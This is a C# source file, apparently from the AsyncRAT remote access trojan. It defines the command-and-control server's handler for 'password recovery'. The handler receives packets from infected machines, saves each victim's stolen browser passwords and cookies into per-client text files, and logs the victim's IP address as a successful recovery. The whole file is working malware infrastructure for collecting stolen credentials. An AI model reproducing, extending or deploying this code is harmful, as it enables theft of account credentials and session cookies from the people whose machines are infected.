using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Handle_Packet
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                File.WriteAllText(fullPath + "\\Password.txt", unpack_msgpack.ForcePathObject("Password").AsString);
                File.WriteAllText(fullPath + "\\Cookies.txt", unpack_msgpack.ForcePathObject("Cookies").AsString);
                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
            }
            catch { }
        }
    }
}
